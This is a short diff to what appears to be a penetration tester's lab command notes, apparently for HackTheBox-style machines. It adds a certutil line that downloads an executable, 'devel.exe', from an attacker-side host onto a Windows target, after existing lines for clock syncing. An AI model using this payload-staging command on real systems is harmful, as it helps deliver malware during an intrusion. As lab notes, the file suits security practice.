@@ -4,3 +4,5 @@ ifconfig | grep -w inet | awk '{print $2}'
 
 sudo timedatectl set-ntp off
 sudo ntpdate -s 10.129.36.72
+
+certutil -urlcache -split -f "http://10.10.15.244/devel.exe" devel.exe
